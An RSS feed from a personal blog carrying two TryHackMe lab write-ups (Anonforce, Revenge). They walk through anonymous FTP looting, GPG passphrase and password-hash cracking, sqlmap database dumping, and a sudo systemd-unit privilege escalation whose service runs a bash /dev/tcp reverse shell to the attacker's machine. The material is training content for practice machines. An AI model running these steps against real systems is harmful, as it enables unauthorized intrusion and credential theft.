<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Tanishq Chaudhary</title>
        <link>https://chaudhary1337.github.io/</link>
        <description>Recent content on Tanishq Chaudhary</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Mon, 28 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>TryHackMe: Anonforce Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-anonforce-writeup/</link>
        <pubDate>Mon, 28 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-anonforce-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/cLFThE9.png" alt="Featured image of post TryHackMe: Anonforce Writeup" /&gt;&lt;h1 id=&#34;anonforce&#34;&gt;Anonforce&lt;/h1&gt;
&lt;h6 id=&#34;tags-oscp-thm&#34;&gt;tags: &lt;code&gt;OSCP&lt;/code&gt; &lt;code&gt;THM&lt;/code&gt;&lt;/h6&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/bsidesgtanonforce&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-port-scanning&#34;&gt;1. Port Scanning&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jun 27 19:02 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -&amp;gt; boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  103 0        0               0 Jun 27 19:02 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jun 27 19:02 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jun 27 19:02 sys
| drwxrwxrwt    9 0        0            4096 Jun 27 19:02 tmp [NSE: writeable]
| drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
| drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
| lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-157-generic
|_lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-142-generic
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.8.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Information gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FTP running on port 21, with anon login allowed!&lt;/li&gt;
&lt;li&gt;SSH open&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A full scan does not reveal any additional information.&lt;/p&gt;
&lt;h2 id=&#34;2-ftp-anonymous-login&#34;&gt;2. FTP: Anonymous Login&lt;/h2&gt;
&lt;p&gt;We explore a bit.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..
-rw-------    1 0        0             117 Aug 11  2019 .bash_history
-rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout
-rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc
drwx------    2 1000     1000         4096 Aug 11  2019 .cache
drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano
-rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile
-rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful
-rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp&amp;gt; pwd
257 &amp;quot;/home/melodias&amp;quot; is the current directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We get the user.txt file!&lt;/p&gt;
&lt;h2 id=&#34;3-more-exploration&#34;&gt;3. More Exploration&lt;/h2&gt;
&lt;p&gt;I noticed a directory named &lt;code&gt;/notread&lt;/code&gt;, with all the permissions :o&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp&amp;gt; pwd
257 &amp;quot;/notread&amp;quot; is the current directory
ftp&amp;gt; get backup.pgp
local: backup.pgp remote: backup.pgp
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
226 Transfer complete.
524 bytes received in 0.00 secs (5.6787 MB/s)
ftp&amp;gt; get private.asc
local: private.asc remote: private.asc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for private.asc (3762 bytes).
226 Transfer complete.
3762 bytes received in 0.00 secs (10.5833 MB/s)
ftp&amp;gt; 
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like we have pgp and asc files. Here&amp;rsquo;s what to do next.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Import private.asc key&lt;/li&gt;
&lt;li&gt;if it asks for a password, use &lt;code&gt;gpg2john&lt;/code&gt; to get the passphase&lt;/li&gt;
&lt;li&gt;decrypt the pgp key&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Easy!&lt;/p&gt;
&lt;h2 id=&#34;4-to-root&#34;&gt;4. To root!&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ gpg2john private.asc &amp;gt; hash

File private.asc
                                                                                                                          
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 6 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{password_here!}          (anonforce)
1g 0:00:00:00 DONE (2021-06-27 22:31) 20.00g/s 18600p/s 18600c/s 18600C/s lolipop..sheena
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
                                                                                                                          
┌──(kali㉿kali)-[/tmp]
└─$ gpg --import private.asc 
gpg: key B92CD1F280AD82C2: &amp;quot;anonforce &amp;lt;melodias@anonforce.nsa&amp;gt;&amp;quot; not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: &amp;quot;anonforce &amp;lt;melodias@anonforce.nsa&amp;gt;&amp;quot; not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                          
┌──(kali㉿kali)-[/tmp]
└─$ gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      &amp;quot;anonforce &amp;lt;melodias@anonforce.nsa&amp;gt;&amp;quot;
root:{root_details_were_here}
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s try going to root directly?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ john root --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{root_password_yes!}           (root)
1g 0:00:00:00 DONE (2021-06-27 22:33) 1.111g/s 7680p/s 7680c/s 7680C/s horoscope..better
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh root@10.10.66.12  
The authenticity of host &#39;10.10.66.12 (10.10.66.12)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.66.12&#39; (ECDSA) to the list of known hosts.
root@10.10.66.12&#39;s password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# ls
root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Revenge Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/</link>
        <pubDate>Sun, 27 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/mCXuoCT.png" alt="Featured image of post TryHackMe: Revenge Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/revenge&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This room has a solid start:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I&#39;ve done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I&#39;ll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that&#39;s running the website and deface the front page.  
I don&#39;t care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don&#39;t want to cause irreparable damage.

When you finish the job, you&#39;ll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port 22 open with SSH running&lt;/li&gt;
&lt;li&gt;port 80 open with http running&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A complete port scan does not reveal any more information.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;p&gt;Gobuster scan:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 108 -q -u 10.10.212.230
/index                (Status: 200) [Size: 8541]
/login                (Status: 200) [Size: 4980]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/static               (Status: 301) [Size: 194] [--&amp;gt; http://10.10.212.230/static/]
/admin                (Status: 200) [Size: 4983]                                  
/requirements.txt     (Status: 200) [Size: 258]
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;home page of rubber ducky
&lt;img src=&#34;https://i.imgur.com/PY9GOnn.jpg&#34; alt=&#34;home page of rubber ducky&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Login page redirects to an &lt;code&gt;action=#&lt;/code&gt; in the url.
&lt;img src=&#34;https://i.imgur.com/mx5kY2I.png&#34; alt=&#34;login page redirects to an &amp;lt;code&amp;gt;action=#&amp;lt;/code&amp;gt; in the url&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;requirements.txt&lt;/code&gt; file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-sub-domain-fuzzing-fail-can-be-skipped&#34;&gt;1.4. Sub-domain Fuzzing (fail) (can be skipped)&lt;/h3&gt;
&lt;p&gt;Add the line &lt;code&gt;10.10.212.230   ducky.thm&lt;/code&gt; to the &lt;code&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.10.212.230   ducky.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We find any subdomains by using &lt;code&gt;wfuzz&lt;/code&gt;: &lt;code&gt;wfuzz -c -w ~/Desktop/tools/files/subdomains-top1million-5000.txt -u &#39;http://ducky.thm/&#39; -H &amp;quot;Host: FUZZ.ducky.thm&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s whats happening:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-c is for color&lt;/li&gt;
&lt;li&gt;-w is for wordlist&lt;/li&gt;
&lt;li&gt;-H is for host&lt;/li&gt;
&lt;li&gt;-u is for URL&lt;/li&gt;
&lt;li&gt;FUZZ is replaced by the item in the wordlist&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ wfuzz -c -w ~/Desktop/tools/files/subdomains-top1million-5000.txt -u &#39;http://ducky.thm/&#39; -H &amp;quot;Host: FUZZ.ducky.thm&amp;quot; --hw 636
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ducky.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                 
=====================================================================


Total time: 0
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 0
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;15-sqli-fail-can-be-skipped&#34;&gt;1.5. SQLI (fail) (can be skipped)&lt;/h3&gt;
&lt;p&gt;We can check for SQL Injection vulnerabilities using SQLmap: &lt;code&gt;sqlmap -u http://10.10.212.230/admin --forms --dump-all&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;However,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[ERROR] all tested parameters do not appear to be injectable.
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;16-login-page-exploration-fail-can-be-skipped&#34;&gt;1.6. Login Page Exploration (fail) (can be skipped)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;GET /login?action= HTTP/1.1
Host: 10.10.212.230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.212.230/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like &amp;hellip; the username and password is not being sent at all?!&lt;/p&gt;
&lt;p&gt;This means that we are looking at something else &amp;hellip;
Even in sqlmap, I noticed the form that was being epxloited was the &lt;code&gt;GET&lt;/code&gt; form,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[01:25:18] [INFO] searching for forms
[#1] form:
GET http://10.10.212.230/login?action=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that we want to fill in and add parameters for &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Perhaps something like this: http://10.10.212.230/login?username=&amp;amp;password=&amp;amp;action=&lt;/p&gt;
&lt;p&gt;Oh! And recall we had &lt;code&gt;pymysql&lt;/code&gt; present in the &lt;code&gt;requirements.txt&lt;/code&gt; file. This means we are using MySQL as the database.&lt;/p&gt;
&lt;p&gt;So I tried and then tried some more but it failed. What next? Well I noticed something interesting back in the error pages.&lt;/p&gt;
&lt;h3 id=&#34;17-error-error&#34;&gt;1.7. Error! Error!&lt;/h3&gt;
&lt;p&gt;You see, the &lt;code&gt;/products/1&lt;/code&gt; page is fine, but &lt;code&gt;/products/100&lt;/code&gt; page gives a 500 error. This is server side error.
&lt;img src=&#34;https://i.imgur.com/WkcowAt.png&#34; alt=&#34;500 error code seen on non existent product&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;On the other hand, a page like &lt;code&gt;/pwn&lt;/code&gt; gives:
&lt;img src=&#34;https://i.imgur.com/mEnYPNA.png&#34; alt=&#34;404 error code not found&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;See the difference? Maybe, what we are looking for, is an attack on the &lt;code&gt;/products/&lt;/code&gt; page!&lt;/p&gt;
&lt;p&gt;Run: &lt;code&gt;sqlmap -u http://10.10.212.230/products/1  --dump&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | {hash_was_here!} |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;code&gt;user&lt;/code&gt; table we get the first flag :D&lt;/p&gt;
&lt;h3 id=&#34;18-hash-cracking&#34;&gt;1.8. Hash Cracking&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 6 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{hidden}         (?)
1g 0:00:00:00 DONE (2021-06-27 01:49) 3.846g/s 1038p/s 1038c/s 1038C/s hellokitty..hotmail
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;We know the &lt;code&gt;/login&lt;/code&gt; and the &lt;code&gt;/admin&lt;/code&gt; pages are completely useless. That leaves us with SSH.&lt;/p&gt;
&lt;p&gt;After lots of manual bruteforcing, I found the username is actually &lt;code&gt;server-admin&lt;/code&gt; and not &lt;code&gt;sadmin&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh server-admin@10.10.212.230
server-admin@10.10.212.230&#39;s password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.


################################################################################
#                        Ducky Inc. Web Server 00080012                        #
#            This server is for authorized Ducky Inc. employees only           #
#                  All actiions are being monitored and recorded               #
#                    IP and MAC addresses have been logged                     #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;21-exploration&#34;&gt;2.1. Exploration&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Users&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ ls /home
server-admin
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;crontab&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;SUID&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ find / -type f -perm -u=s 2&amp;gt; /dev/null
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;SUDO&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Looks like sudo can lead us to root!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;h3 id=&#34;31-getting-root&#34;&gt;3.1. Getting root&lt;/h3&gt;
&lt;p&gt;Type in: &lt;code&gt;sudoedit /etc/systemd/system/duckyinc.service&lt;/code&gt; and replace the contents with the below.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Unit]
Description=pwn

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/IP/1337 0&amp;gt;&amp;amp;1&#39;

[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Make sure to replace the IP as per your attacking machine. Also, start a listener &lt;code&gt;nc -lnvp 1337&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I did the following,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
server-admin@duckyinc:~$ sudo /bin/systemctl start duckyinc.service
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have the shell!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337         
listening on [any] 1337 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.212.230] 44520
bash: cannot set terminal process group (16663): Inappropriate ioctl for device
bash: no job control in this shell
root@duckyinc:/# cd /root
cd /root
root@duckyinc:~# ls
